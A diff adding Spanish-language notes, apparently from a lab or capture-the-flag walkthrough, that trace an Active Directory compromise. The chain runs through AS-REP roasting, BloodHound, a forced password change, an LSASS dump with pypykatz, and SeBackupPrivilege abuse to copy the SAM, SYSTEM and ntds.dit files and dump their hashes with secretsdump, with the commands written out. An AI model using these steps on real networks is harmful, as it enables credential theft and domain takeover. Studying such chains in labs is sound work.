@@ -1,0 +1,38 @@
+- Observar la version de windows server a través del Build
+- Listar el contenido a nivel de red se smb
+- Utilizar kerbrute para validar usuarios validos en el sistema
+- Utilizar **GetNPUsers.py** para efectuar un ASREPRoast attack con los usuarios validos
+- Efectuar un ataque de fuerza bruta al hash brindado por el ASREPRoas Attack
+- **DATO**: Cuando se cuenta con credenciales validas, se efectua un kerberoasting attack(**GetUserSPNs.py**) y cuando se tenga un listado potencial de usuarios se tira de ASREPRoas attack(**GetNPUsers.py**)
+- Validar las credenciales a travéz de CrackMapExec
+- Listas el contenido a nivel de red de smb con las credenciales encontradas 
+- Dumpear informacion del DC con **ldapdomaindump** con el usuario comprometido
+- Iniciar un servidor para listar el contenido (Filtrar por *domain_users_by_group.html*)
+- Inspeccionar los usuarips y grupos a nivel de sistema
+- Hacer uso de bloodhound 
+	1. ``neo4j console``
+	2. ``bloodhound & disown
+- Uso de ''**Bloodhound-python** ``bloodhound-python -c all -u '$user' -p '$password' -ns $ip -d $domain
+- **Bloodhound-python** dumpea informacion que podemos importar a la interfaz de **Bloodhound** 
+- Find principals with DCSync Right
+- Si no se encuentra nada interesante, filtrar por el usuario comprometido -> Mark User as Owned
+- **Nota**: En node info, se puede ver que cosas se pueden hacer con el usuario comprometido -> Group Mermbership
+- Change the password trought ``net rcp passowrd $userToChange -U '$MyUser' -S $server`` 
+- Jugar con rpcclient ``rpcclient -U '$user%$password' $ip``
+- Validar la contraseña cambiada con **CrackMapExec**
+- Listar denuevo el contenido compartido a nivel de red con el nuevo usuario comprometido
+- **LSASS**: Archivo de politicas de seguridad de windows
+- Descargar el archivo llamativo
+- Jugar con pypykatz ``pypykatz lsa minidump $archivo.DMP``
+- Intentar PassTheHash(users find in the LSASS file)
+- Explotar SeBackupPrivilage
+- Crear copia del archivo system y el archivo sam ``reg save HKLM\system system`` ``reg save HKLM\sam sam``
+- Usar **impacket-secretdump** 
+- Crear una copia de C:\\Windows\\NTDS\\ntds.dit con el privilegio que tenemos de crear backups, todo esto con shadowcopy
+![[Pasted image 20221026225631.png]]
+- Utilizar el script diskshadows
+- Esto crea una copia de C: en Z:
+- Intentar copiar el NTDS con robocopy(*copy no funciona*)
+- ``robocopy /b z:\Windows\NTDS\ . ntds.dit``
+- Volver a utilizar **impacket-secretdump** con el ntds explotado ``impacket-secretdump -system system -ntds ntds.dit LOCAL``
+- **Evil-winrm** para conectarse a la maquina victima como administrator
